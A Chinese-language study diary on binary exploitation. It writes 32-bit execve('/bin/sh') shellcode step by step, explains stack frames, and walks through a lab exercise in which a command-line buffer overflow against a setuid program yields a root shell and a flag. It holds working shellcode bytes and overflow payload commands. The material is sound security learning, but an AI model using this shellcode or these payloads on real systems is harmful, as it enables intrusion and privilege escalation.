```
学习日记5
```

**shellcode**

是一段机器指令，用于在溢出之后改变系统的正常流程，转而执行shellcode从而入侵目标系统。

shellcode基本的编写方式：

- 编写c程序实现功能
- 使用汇编来替代函数调用等
- 汇编编译链接，获取机器码

这里使用c语言来进行编写。

```c
#include<stdio.h>
int main()
{
    char *name[2];
    name[0]="/bin/sh";
    name[1]=NULL;
    execve(name[0],name,NULL);
}
```

其中execve进行系统调用，通过name[0]提供的参数"/bin/sh"起一个shell。 execve（参数1，参数2，参数3） 参数1：命令所在路径 参数2：命令的集合 参数3：传递给执行文件的环境变量集尝试编译运行。

```shell
$ gcc shell.c -o shell
$ ./shell
$ echo u got it
u got it
```

用gdb查看

```assembly
$ gdb shell -q
pwndbg: loaded 164 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from shell...(no debugging symbols found)...done.
pwndbg> disass main
Dump of assembler code for function main:
   0x0000000000400596 <+0>: push   rbp
   0x0000000000400597 <+1>: mov    rbp,rsp
   0x000000000040059a <+4>: sub    rsp,0x20
   0x000000000040059e <+8>: mov    rax,QWORD PTR fs:0x28
   0x00000000004005a7 <+17>:    mov    QWORD PTR [rbp-0x8],rax
   0x00000000004005ab <+21>:    xor    eax,eax
   0x00000000004005ad <+23>:    mov    QWORD PTR [rbp-0x20],0x400674
   0x00000000004005b5 <+31>:    mov    QWORD PTR [rbp-0x18],0x0
   0x00000000004005bd <+39>:    mov    rax,QWORD PTR [rbp-0x20]
   0x00000000004005c1 <+43>:    lea    rcx,[rbp-0x20]
   0x00000000004005c5 <+47>:    mov    edx,0x0
   0x00000000004005ca <+52>:    mov    rsi,rcx
   0x00000000004005cd <+55>:    mov    rdi,rax
   0x00000000004005d0 <+58>:    call   0x400480 <execve@plt>
   0x00000000004005d5 <+63>:    mov    eax,0x0
   0x00000000004005da <+68>:    mov    rdx,QWORD PTR [rbp-0x8]
   0x00000000004005de <+72>:    xor    rdx,QWORD PTR fs:0x28
   0x00000000004005e7 <+81>:    je     0x4005ee <main+88>
   0x00000000004005e9 <+83>:    call   0x400460 <__stack_chk_fail@plt>
   0x00000000004005ee <+88>:    leave
   0x00000000004005ef <+89>:    ret
End of assembler dump.
pwndbg>
```

其中关键点在 

```assembly
0x00000000004005c5 <+47>:   mov    edx,0x0
0x00000000004005ca <+52>:   mov    rsi,rcx
0x00000000004005cd <+55>:   mov    rdi,rax
0x00000000004005d0 <+58>:   call   0x400480 <execve@plt>
```

传递了三个参数并且call execve()。 直接使用这四条指令显然是不行的，shellcode需要能够独立运行并且尽量短小，这里的call 0x400480 <execve@plt>依赖plt表，前面的参数传递也依赖程序的数据段等，我们需要用汇编来重写这里的代码。 对于call 0x400480 <execve@plt>，我们可以用系统调用来重写，execve的调用号为：0xb，那么就有 

```assembly
mov al,0xb
int 0x80
```

这里的0x80是根据al的值进行系统调用。 为了传参方便，这里采用32位汇编的写法，把参数push到栈上就可以传递参数了。 先将"/bin/sh"压栈

```assembly
xor eax,eax
push eax
push 0x68732f2f
push 0x6e69622f
```

注意这里用xor eax,eax把eax置0，不使用mov eax,0的原因是这样会出现\x00，shellcode会被gets()这类函数截断。 esp指向当前栈顶，此时即指向"/bin/sh",我们把esp保存到ebx 

```assembly
mov ebx,esp
```

现在把两个参数压栈，eax为NULL(0)，ebx为"/bin/sh"的地址

```assembly
push eax
push ebx
```

此时esp指向数组argv，把它赋值给ecx。

```assembly
mov ecx,esp
xor edx,edx
mov al,0xb
int 0x80       ;通过中断0x80进行系统调用
```

所以有完整的代码： 

```assembly
section .text
global _start
_start:
xor eax,eax
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx,esp
push eax
push ebx
mov ecx,esp
xor edx,edx
mov al,0xb
int 0x80
```

保存为shell.asm，使用nasm编译，链接，运行（nasm可以使用 sudo apt-get install nasm 进行安装）

```shell
$ nasm -f elf32 shell.asm -o shell.o
$ ld -m elf_i386 -o shell shell.o
$ ./shell
$ echo u got it
u got it
```

成功了，使用objdump提取

```assembly
$ objdump -d shell
shell:     file format elf32-i386
Disassembly of section .text:
08048060 <_start>:
 8048060:   31 c0                   xor    %eax,%eax
 8048062:   50                      push   %eax
 8048063:   68 2f 2f 73 68          push   $0x68732f2f
 8048068:   68 2f 62 69 6e          push   $0x6e69622f
 804806d:   89 e3                   mov    %esp,%ebx
 804806f:   50                      push   %eax
 8048070:   53                      push   %ebx
 8048071:   89 e1                   mov    %esp,%ecx
 8048073:   31 d2                   xor    %edx,%edx
 8048075:   b0 0b                   mov    $0xb,%al
 8048077:   cd 80                   int    $0x80
```

这样就提取到了,下面可以写个c程序验证一下。

```shell
#include <stdio.h>
char shellcode[]="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80";
int main()
{
    void (*fp) (void);
    fp=(void *)shellcode;
    fp();
}

$ gcc auth.c -fno-stack-protector -o auth -z execstack -m32
$ ./auth
$ echo u got it
u got it
```

**栈溢出之篡改邻近变量**

1. 通过-fno-stack-protector和-m32参数从gcc编译stack0.c文件。
2. 运行编译后的程序，通过缓冲区溢出修改与字符串数组相邻的变量，得到输出"you     have changed the 'modified' variable"
3. 运行stack1程序，通过栈溢出得到输出"you     have correctly got the variable to the right value"

缓冲区溢出（buffer overflow），是针对程序设计缺陷，向程序输入缓冲区写入使之溢出的内容（通常是超过缓冲区能保存的最大数据量的数据），从而破坏程序运行、趁著中断之际并获取程序乃至系统的控制权。

**栈溢出之ShellCode简例**

```c
char *pwnthis()
{
  char s; // [sp+0h] [bp-48h]@1
return gets(&s);
}
int win()
{
  return puts("code flow successfully changed");
}
```

```assembly
.text:08048454 ; ==== S U B R O U T I N E ==========================================================================
.text:08048454
.text:08048454 ; Attributes: bp-based frame
.text:08048454
.text:08048454                 public pwnthis
.text:08048454 pwnthis         proc near               ; CODE XREF: main+11p
.text:08048454
.text:08048454 s               = byte ptr -48h
.text:08048454
.text:08048454                 push    ebp
.text:08048455                 mov     ebp, esp
.text:08048457                 sub     esp, 48h
.text:0804845A                 sub     esp, 0Ch
.text:0804845D                 lea     eax, [ebp+s]
.text:08048460                 push    eax             ; s
.text:08048461                 call    _gets
.text:08048466                 add     esp, 10h
.text:08048469                 nop
.text:0804846A                 leave
.text:0804846B                 retn
.text:0804846B pwnthis         endp

```

pwnthis()函数中有且仅有一个危险函数gets(&s);,目标仍然是跳转到函数win()上获得输出code flow successfully changed。

在IDA pro中双击 char s查看栈的结构

```assembly
-00000048 s               db ?
-00000047                 db ? ; undefined
-00000046                 db ? ; undefined
-00000045                 db ? ; undefined
-00000044                 db ? ; undefined
-00000043                 db ? ; undefined
-00000042                 db ? ; undefined
-00000041                 db ? ; undefined
-00000040                 db ? ; undefined
-0000003F                 db ? ; undefined
-0000003E                 db ? ; undefined
-0000003D                 db ? ; undefined
-0000003C                 db ? ; undefined
-0000003B                 db ? ; undefined
-0000003A                 db ? ; undefined
-00000039                 db ? ; undefined
-00000038                 db ? ; undefined
-00000037                 db ? ; undefined
-00000036                 db ? ; undefined
-00000035                 db ? ; undefined
-00000034                 db ? ; undefined
-00000033                 db ? ; undefined
-00000032                 db ? ; undefined
-00000031                 db ? ; undefined
-00000030                 db ? ; undefined
-0000002F                 db ? ; undefined
-0000002E                 db ? ; undefined
-0000002D                 db ? ; undefined
-0000002C                 db ? ; undefined
-0000002B                 db ? ; undefined
-0000002A                 db ? ; undefined
-00000029                 db ? ; undefined
-00000028                 db ? ; undefined
-00000027                 db ? ; undefined
-00000026                 db ? ; undefined
-00000025                 db ? ; undefined
-00000024                 db ? ; undefined
-00000023                 db ? ; undefined
-00000022                 db ? ; undefined
-00000021                 db ? ; undefined
-00000020                 db ? ; undefined
-0000001F                 db ? ; undefined
-0000001E                 db ? ; undefined
-0000001D                 db ? ; undefined
-0000001C                 db ? ; undefined
-0000001B                 db ? ; undefined
-0000001A                 db ? ; undefined
-00000019                 db ? ; undefined
-00000018                 db ? ; undefined
-00000017                 db ? ; undefined
-00000016                 db ? ; undefined
-00000015                 db ? ; undefined
-00000014                 db ? ; undefined
-00000013                 db ? ; undefined
-00000012                 db ? ; undefined
-00000011                 db ? ; undefined
-00000010                 db ? ; undefined
-0000000F                 db ? ; undefined
-0000000E                 db ? ; undefined
-0000000D                 db ? ; undefined
-0000000C                 db ? ; undefined
-0000000B                 db ? ; undefined
-0000000A                 db ? ; undefined
-00000009                 db ? ; undefined
-00000008                 db ? ; undefined
-00000007                 db ? ; undefined
-00000006                 db ? ; undefined
-00000005                 db ? ; undefined
-00000004                 db ? ; undefined
-00000003                 db ? ; undefined
-00000002                 db ? ; undefined
-00000001                 db ? ; undefined
+00000000  s              db 4 dup(?)
+00000004  r              db 4 dup(?)
```

其中 48处的s是指字符数组s，00处的s指保存在栈上的寄存器，r指的是返回地址，我们的目标就是覆盖返回地址，使函数在执行ret指令时，将我们覆盖的返回地址的值pop弹出到eip，从而改变程序的执行流。

堆栈是一块保存数据的连续内存。 一个名为堆栈指针(SP)的寄存器指向堆栈的顶部。 堆栈的底部在一个固定的地址。 堆栈的大小在运行时由内核动态地调整。 CPU实现指令 PUSH和POP， 向堆栈中添加元素和从中移去元素。 堆栈由逻辑堆栈帧组成。 当调用函数时逻辑堆栈帧被压入栈中， 当函数返回时逻辑 堆栈帧被从栈中弹出。 堆栈帧包括函数的参数， 函数的局部变量， 以及恢复前一个堆栈 帧所需要的数据， 其中包括在函数调用时指令指针(IP)的值。 堆栈既可以向下增长(向内存低地址)也可以向上增长， 这依赖于具体的实现。 在我 们的例子中， 堆栈是向下增长的。 这是很多计算机的实现方式， 包括Intel， Motorola， SPARC和MIPS处理器。 堆栈指针(SP)也是依赖于具体实现的。 它可以指向堆栈的最后地址， 或者指向堆栈之后的下一个空闲可用地址。 在我们的讨论当中， SP指向堆栈的最后地址。 除了堆栈指针(SP指向堆栈顶部的的低地址)之外， 为了使用方便还有指向帧内固定 地址的指针叫做帧指针(FP)。 有些文章把它叫做局部基指针(LB-local base pointer)。 从理论上来说， 局部变量可以用SP加偏移量来引用。 然而， 当有字被压栈和出栈后， 这 些偏移量就变了。 尽管在某些情况下编译器能够跟踪栈中的字操作， 由此可以修正偏移 量， 但是在某些情况下不能。 而且在所有情况下， 要引入可观的管理开销。 而且在有些 机器上， 比如Intel处理器， 由SP加偏移量访问一个变量需要多条指令才能实现。 因此， 许多编译器使用第二个寄存器， FP， 对于局部变量和函数参数都可以引用， 因为它们到FP的距离不会受到PUSH和POP操作的影响。 在Intel CPU中， BP(EBP)用于这 个目的。 在Motorola CPU中， 除了A7(堆栈指针SP)之外的任何地址寄存器都可以做FP。 考虑到我们堆栈的增长方向， 从FP的位置开始计算， 函数参数的偏移量是正值， 而局部 变量的偏移量是负值。 当一个例程被调用时所必须做的第一件事是保存前一个FP(这样当例程退出时就可以 恢复)。 然后它把SP复制到FP， 创建新的FP， 把SP向前移动为局部变量保留空间。 这称为 例程的序幕(prolog)工作。 当例程退出时， 堆栈必须被清除干净， 这称为例程的收尾 (epilog)工作。 Intel的ENTER和LEAVE指令， Motorola的LINK和UNLINK指令， 都可以用于 有效地序幕和收尾工作。

**步骤1：** 程序源代码

```c
void vuln(int tmp, char *str) {
    int win = tmp;
    char buf[64];
    strcpy(buf, str);
    dump_stack((void **) buf, 23, (void **) &tmp);
    printf("win = %d\n", win);
    if (win == 1) {
        execl("/bin/sh", "sh", NULL);
    } else {
        printf("Sorry, you lose.\n");
    }
    exit(0);
}
int main(int argc, char **argv) {
    if (argc != 2) {
        printf("Usage: stack_overwrite [str]\n");
        return 1;
    }
uid_t euid = geteuid();
    setresuid(euid, euid, euid);
    vuln(0, argv[1]);
    return 0;
}
```

**步骤2：** 首先，我们打开平台，点击操作机，点击通过web ssh登录进入控制台。

**步骤3：** 我们输入ls，查看当前文件夹下有三个文件，我们尝试cat flag，发现权限缺失，所以我们尝试利用overflow1-3948d17028101c40的漏洞进行攻击。

**步骤4：** 首先，我们的输入是程序的命令行参数。第二，如果我们可以设置win变量等于1，我们会得到一个shell！ 让我们进行cat flag。

```assembly
$ ./overflow1-3948d17028101c40 $(python -c 'print "A"*64 + "B"')
Stack dump:
0xffa81994: 0xffa82845 (second argument)
0xffa81990: 0x00000000 (first argument)
0xffa8198c: 0x0804870f (saved eip)
0xffa81988: 0xffa819b8 (saved ebp)
0xffa81984: 0xf779c000
0xffa81980: 0xf76a8a00
0xffa8197c: 0x00000042
0xffa81978: 0x41414141
0xffa81974: 0x41414141
0xffa81970: 0x41414141
0xffa8196c: 0x41414141
0xffa81968: 0x41414141
0xffa81964: 0x41414141
0xffa81960: 0x41414141
0xffa8195c: 0x41414141
0xffa81958: 0x41414141
0xffa81954: 0x41414141
0xffa81950: 0x41414141
0xffa8194c: 0x41414141
0xffa81948: 0x41414141
0xffa81944: 0x41414141
0xffa81940: 0x41414141
0xffa8193c: 0x41414141 (beginning of buffer)
win = 66
Sorry, you lose.
```

**步骤5：** 你会看到，如果我们填满了缓冲区（“A”* 64）和一个"B"字母，win的值会改变。 对于那些不知道的人，“B”的ascii值是66，这意味着我们可以控制win变量。 我们所要做的就是提交一个ascii值为1的字符。由于这是不可打印的，我们将在python中使用转义序列。

```assembly
$ ./overflow1-3948d17028101c40 $(python -c 'print "A"*64 + "\x01"')
Stack dump:
0xff828874: 0xff829848 (second argument)
0xff828870: 0x00000000 (first argument)
0xff82886c: 0x0804870f (saved eip)
0xff828868: 0xff828898 (saved ebp)
0xff828864: 0xf77b7000
0xff828860: 0xf76c3aa7
0xff82885c: 0x00000001
0xff828858: 0x41414141
0xff828854: 0x41414141
0xff828850: 0x41414141
0xff82884c: 0x41414141
0xff828848: 0x41414141
0xff828844: 0x41414141
0xff828840: 0x41414141
0xff82883c: 0x41414141
0xff828838: 0x41414141
0xff828834: 0x41414141
0xff828830: 0x41414141
0xff82882c: 0x41414141
0xff828828: 0x41414141
0xff828824: 0x41414141
0xff828820: 0x41414141
0xff82881c: 0x41414141 (beginning of buffer)
win = 1
$
```

**步骤6：** 之后，我们输入id，发现我们已经拿到了root的权限。然后我们再cat flag，这次便成功获取到flag了。

